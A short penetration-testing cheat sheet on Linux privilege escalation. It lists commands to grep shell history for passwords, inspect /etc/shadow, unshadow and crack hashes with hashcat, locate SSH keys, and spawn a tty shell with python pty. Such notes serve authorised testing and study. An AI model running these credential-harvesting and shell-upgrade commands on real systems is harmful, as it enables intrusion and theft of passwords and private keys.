
GTFOBins
**/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh**

**cat ~/.bash_history | grep -i passw**
**ls -la /etc/shadow**
**unshadow <PASSWORD-FILE> <SHADOW-FILE> > unshadowed.txt**

**hashcat -m 1800 unshadowed.txt rockyou.txt -O**


**find / -name authorized_keys 2> /dev/null**
find / -name id_rsa 2> /dev/null 

**Always go for a tty shell if you have a worse shell if possible**

use a command like [(see here)](https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell)
```
python -c 'import pty; pty.spawn("/bin/sh")'
```
